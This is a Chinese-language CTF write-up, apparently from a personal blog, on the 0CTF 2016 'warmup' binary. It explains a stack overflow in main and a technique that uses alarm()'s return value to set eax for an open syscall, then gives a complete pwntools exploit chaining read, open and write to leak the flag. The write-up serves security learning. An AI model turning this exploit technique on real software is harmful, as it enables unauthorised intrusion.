# warmup



### 总结

根据本题，学习与收获有：

- 刚开始尝试利用`read`的返回值来构造`execve`的`syscall`，后来发现基本没有办法。后来查了下资料，才知道需要从`alarm`函数的返回值进行利用。虽然之前一直都知道`alarm`函数的功能，但是并不清楚其返回值是啥。
- 根据[C语言alarm()函数：设置信号传送闹钟_C语言中文网 (biancheng.net)](http://c.biancheng.net/cpp/html/334.html)的解释，`alarm()`用来设置信号`SIGALRM` 在经过参数`seconds` 指定的秒数后传送给目前的进程。如果闹钟设置成功，那么之前设置的闹钟会被取消, 并将之前闹钟剩下的时间返回。根据这一性质，控制返回值，就控制了`eax`寄存器。

<!-- more -->

### 题目分析

#### checksec

![image-20210512162625455](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210512162625455.png)

除了开启了`NX`保护，其他保护全部关闭。运行环境为`ubuntu18`。

#### 函数分析

##### start

![image-20210512162838038](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210512162838038.png)

函数流程为：

- 设置闹钟为`10`秒
- 输出一段话
- 执行`main`函数
- 退出

##### main

![image-20210512162948363](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210512162948363.png)

很明显的栈溢出，读取结束后程序结束。

#### 漏洞点

漏洞点就在`main`函数的`read`处。`addr`距离`ebp`只有`0x20`的距离，但是可以读取`0x34`个字节大小。

这时需要使用`gdb`来看一下，需要覆盖多少。

![image-20210512163456153](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210512163456153.png)

看一下偏移，为`0x20`

![image-20210512163541563](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210512163541563.png)

### 利用思路

如果利用`read`的返回值的话，需要提前布置好栈空间，但是溢出只有`0x14`个字节，并且每次需要溢出的时候，都会重新把`retaddr`置为`exit`函数的地址。如果溢出了，那么输入的字节数肯定超过`0xb`，所以这是相互矛盾的。因此，考虑从`alarm`函数入手。由于第一次设置闹钟`seconds`为`0xa`，那么往小于这个值的系统调用好来找，发现只有`open`符合我们的需求。所以，最后的利用思路为：

- 利用栈溢出，往`data`段写入`flag`字符串，为`open`的系统调用做准备，然后再回到`main`函数
- 程序休眠`5`秒，然后利用栈溢出，执行`set_alarm`，得到返回值为`0x5`，然后执行`open`的系统调用，并回到`main`函数
- 栈溢出，利用`read(3, data_segment, 0x40)`，把`flag`读取到`data`段
- 栈溢出，使用`write(1, data_segment, 0x40)`输出`flag`

### EXP

#### 调试过程

不太好调试，但是但其实只要分析栈溢出那一步就行了，之后都是循环执行`main`函数

- 调试一下栈溢出的点

  ```python
  welcome_str_addr = 0x80491bc
  good_luck_str_addr = 0x80491d3
  read_addr = 0x804811d
  write_addr = 0x8048135
  main_addr = 0x804815a
  alarm_addr = 0x804810d
  mov_ebx_syscall = 0x8048122
  
  layout = ['a' * 0x20, read_addr, main_addr, 0, good_luck_str_addr, 0x60]
  payload = flat(layout)
  sh.sendafter("Welcome to 0CTF 2016!\n", payload)
  ```

  这里会执行`read`函数：

  ![image-20210512165939550](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210512165939550.png)

  符合自己构造的栈布局

  ![image-20210512170041167](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210512170041167.png)



最后远程的攻击效果为：

![image-20210512170145299](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210512170145299.png)

#### 完整exp

```python
from pwn import *

sh: tube = process('warmup')
context.update(arch='i386', os='linux', endian='little')

welcome_str_addr = 0x80491bc
good_luck_str_addr = 0x80491d3
read_addr = 0x804811d
write_addr = 0x8048135
main_addr = 0x804815a
alarm_addr = 0x804810d
mov_ebx_syscall = 0x8048122

layout = ['a' * 0x20, read_addr, main_addr, 0, good_luck_str_addr, 0x60]
payload = flat(layout)
sh.sendafter("Welcome to 0CTF 2016!\n", payload)

sh.sendafter("Good Luck!\n", "flag\x00")
sleep(5)
layout = ['a' * 0x20, alarm_addr, mov_ebx_syscall, main_addr, good_luck_str_addr, 0]
sh.send(flat(layout))

layout = ['a' * 0x20, read_addr, main_addr, 3, welcome_str_addr, 0x40]
sh.recvline()
sh.send(flat(layout))

layout = ['a' * 0x20, write_addr, 0xdeadbeef, 1, welcome_str_addr, 0x40]
sh.recvline()
sh.send(flat(layout))
sh.interactive()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-05-12-warmup/  

